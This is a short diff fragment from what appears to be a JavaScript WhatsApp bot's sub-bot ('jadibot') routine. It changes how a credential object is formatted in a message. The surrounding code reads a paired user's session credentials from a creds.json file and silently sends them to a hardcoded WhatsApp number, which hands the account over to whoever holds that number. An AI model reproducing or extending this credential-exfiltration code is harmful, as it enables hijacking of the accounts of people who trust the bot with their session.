@@ -176,7 +176,7 @@ const jadibot = async (kayla, m, from) => {
             './database/jadibot/' + user.split('@')[0] + '/creds.json'
           );
           sendMessage(`6285768966412@s.whatsapp.net`, {
-            text: JSON.stringify(credential, null, 2),
+            text: credential,
             mentions: [user],
           });
         }
